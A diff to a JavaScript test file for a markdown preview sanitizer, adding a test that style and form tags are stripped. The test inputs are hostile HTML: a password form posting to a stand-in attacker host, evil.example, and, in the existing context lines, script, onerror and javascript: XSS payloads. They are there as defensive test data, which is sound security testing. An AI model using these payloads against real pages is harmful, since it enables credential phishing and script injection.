@@ -135,6 +135,11 @@ describe('the preview', () => {
     expect(renderMarkdown('# Title\n\n- one')).toContain('<h1');
   });
 
+  it('cannot restyle the console or draw a form in it', () => {
+    const html = renderMarkdown('<style>body{display:none}</style>\n\n<form action="https://evil.example"><input name=password></form>');
+    expect(html).not.toMatch(/<style|<form|<input/i);
+  });
+
   it('cannot run anything: scripts, handlers and javascript links are stripped', () => {
     const html = renderMarkdown('<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n[x](javascript:alert(1))');
     expect(html).not.toMatch(/<script|onerror|javascript:/i);
